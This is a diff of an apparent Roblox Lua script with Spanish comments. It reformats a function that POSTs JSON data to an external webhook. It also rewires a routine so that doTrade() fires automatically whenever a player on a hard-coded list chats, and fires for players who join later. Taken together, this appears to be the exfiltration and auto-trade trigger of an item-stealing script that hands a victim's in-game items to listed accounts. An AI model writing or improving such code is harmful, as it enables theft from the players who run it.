@@ -30,12 +30,7 @@ local function SendWebhook(title, description, fields, prefix, thumbnail)
     }
     local body = HttpService:JSONEncode(data)
     pcall(function()
-        req({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"]="application/json"},
-            Body = body
-        })
+        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
     end)
 end
 
@@ -126,12 +121,14 @@ local function doTrade(targetName)
     end
 end
 
--- Detectar jugadores de la lista y enviar trade automáticamente
-local function connectPlayer(p)
+-- Conectar trade al chat de usuarios en la lista
+for _,p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        task.spawn(function() doTrade(p.Name) end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
-
-for _,p in ipairs(Players:GetPlayers()) do connectPlayer(p) end
-Players.PlayerAdded:Connect(connectPlayer)
+Players.PlayerAdded:Connect(function(p)
+    if table.find(users,p.Name) then
+        p.Chatted:Connect(function() doTrade(p.Name) end)
+    end
+end)
